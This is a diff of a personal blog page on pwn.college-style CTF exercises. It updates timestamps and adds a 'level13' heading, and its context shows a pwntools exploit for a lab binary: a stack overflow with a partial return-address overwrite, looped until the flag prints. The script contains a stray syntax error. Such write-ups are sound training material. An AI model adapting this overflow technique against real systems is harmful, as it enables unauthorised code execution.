@@ -36,7 +36,7 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220508231821229.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220505165437735.png">
 <meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-08T16:20:08.757Z">
+<meta property="article:modified_time" content="2022-05-09T12:29:48.636Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
@@ -272,7 +272,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年5月9日 凌晨
+                  不可视境界线最后变动于：2022年5月9日 晚上
                 
               </p>
             
@@ -1636,9 +1636,7 @@
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *                                   <br>binary = <span class="hljs-string">&#x27;./babyrop_level12.1.elf64&#x27;</span>                <br>context.binary = binary                             <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>                         <br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):                                        <br>    p = process(binary)                             <br>    sc = <span class="hljs-string">&#x27;&#x27;&#x27;                                        </span><br><span class="hljs-string">    b *main+0x19f                                   </span><br><span class="hljs-string">    init-pwndbg                                     </span><br><span class="hljs-string">    lm                                              </span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>                                             <br>    <span class="hljs-comment">#gdb.attach(p, gdbscript=sc)                     </span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: 0x&#x27;</span>)                  <br>    buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)                       <br>    pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x48</span>+<span class="hljs-number">8</span>), <span class="hljs-string">b&#x27;\x8b\x79&#x27;</span>, buf])   <br>                                                    <br>    p.send(pl)                                      <br>    <span class="hljs-built_in">all</span> = p.recvall()                               <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:                              <br>        <span class="hljs-keyword">break</span>                                       <br>    <span class="hljs-keyword">else</span>:.                                          <br>        p.kill()                                    <br></code></pre></div></td></tr></table></figure>
 
-
-
-<h1 id="module-B-heap"><a href="#module-B-heap" class="headerlink" title="module B-heap"></a>module B-heap</h1><p>Dynamic Allocators:</p>
+<h4 id="level13-2"><a href="#level13-2" class="headerlink" title="level13"></a>level13</h4><h1 id="module-B-heap"><a href="#module-B-heap" class="headerlink" title="module B-heap"></a>module B-heap</h1><p>Dynamic Allocators:</p>
 <ul>
 <li><strong>General Purpose:</strong> Doug Lea (pictured) releases dlmalloc into public domain in 1987.</li>
 <li><strong>Linux:</strong> ptmalloc (<strong>P</strong>osix <strong>T</strong>hread aware fork of dlmalloc)</li>
